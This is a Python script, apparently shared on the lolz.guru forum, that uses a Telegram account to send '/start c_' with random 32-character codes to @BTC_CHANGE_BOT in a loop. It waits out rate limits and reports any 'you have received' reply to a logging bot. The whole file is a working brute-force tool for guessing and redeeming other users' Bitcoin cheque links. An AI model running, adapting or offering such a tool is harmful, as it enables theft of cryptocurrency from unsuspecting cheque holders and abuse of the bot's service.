import asyncio
import sys
from json import loads
from random import choice
from colorama import Fore,init
from requests import post
from os import system
from telethon import TelegramClient, events
from tqdm import tqdm as progress
from time import sleep,time
from telethon.errors.rpcerrorlist import FloodWaitError
C = Fore
init()
system('clear')
bb =f'''{C.YELLOW}
$$$$$$$   $$$$$$$    $$$$$$ 
$$    $$  $$    $$  $$    $$
$$    $$  $$    $$  $$      
$$$$$$$   $$$$$$$   $$  $$$$
$$    $$  $$    $$  $$    $$
$$    $$  $$    $$  $$    $$
$$$$$$$   $$$$$$$    $$$$$$  
{C.LIGHTYELLOW_EX}by https://lolz.guru/members/2977610/                       
'''

#удалил - гей
print(bb)
chars = "abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
class bbg():
    def __init__(self):
        try:
            with open('config.json','r+',encoding='utf-8') as config:
                config = dict(loads(config.read()))
                self.api_id = int(config['api_id'])
                self.api_hash = config['api_hash']
                self.logs_bot_token = config['logs_bot_token']
                self.logs_user = config['logs_user']
                self.limit_gen = config['limit_gen']
                print(C.LIGHTGREEN_EX+'Config loaded.')
                for i in config:print(C.LIGHTMAGENTA_EX+i,C.RED+'-'+C.MAGENTA,config[i])
        except Exception as e:
            self._log_("Exception as read config.json\n"+str(e))
            print(C.RED+"Exception as read config.json --",e)
            sys.exit(0)
        asyncio.get_event_loop().run_until_complete(self.launch())
        self._log_('Finished work.')
    def _log_(self,message):
                post(
                        url='https://api.telegram.org/bot{0}/{1}'.format(self.logs_bot_token, 'sendMessage'),
                                        data={'chat_id': int(self.logs_user), 'text': '<a href="https://lolz.guru/threads/3656270">[BBG]</a>\n<i>'+message+'</i>','parse_mode': 'html'}
                    )    
    async def connect_to_account(self):
        try:
            self.client = TelegramClient(f'bbg_{str(self.api_id)}',self.api_id,self.api_hash)
            await self.client.start()
            self.loop = self.client.loop
            self._log_("Successful connection to account!")
        except Exception as e:
            self._log_("Exception as connect to account\n"+str(e))
            print(C.RED+'Program exit with 30 seconds.')
            sleep(30)
            sys.exit(0)
    
    async def launch(self):
        await self.connect_to_account()
        self._log_('Started generate.')
        @self.client.on(events.NewMessage)
        async def on_message(event):
            try:
                message = event.message.message
                id = event.original_update.message.peer_id.user_id
                if int(id) == 159405177:
                        if 'вы получили' in message.lower() or 'you have received' in message.lower():self._log_(message)
            except:pass
        for i in progress(range(self.limit_gen),colour='green'):
                start  = time()
                await self.check()
                stop = time()
                if (stop-start) < 1.1: sleep(1.1-(stop-start))
    def generate(self):
        token = ''
        for i in range(32):token += choice(chars)
        return token 


    async def check(self):
        try:
            await self.client.send_message('BTC_CHANGE_BOT','/start c_'+self.generate())
        except FloodWaitError as e:self._log_('Timeout, flood error\n'+str(e));sleep(int(str(e).replace('A wait of ','').replace('seconds is required (caused by SendMessageRequest)','')))
        except Exception as e:self._log_('Exception as send message to @BTC_CHANGE_BOT\n'+str(e))

bbg()
print(C.RED+'Program exit with 30 seconds.')
sleep(30)
sys.exit(0)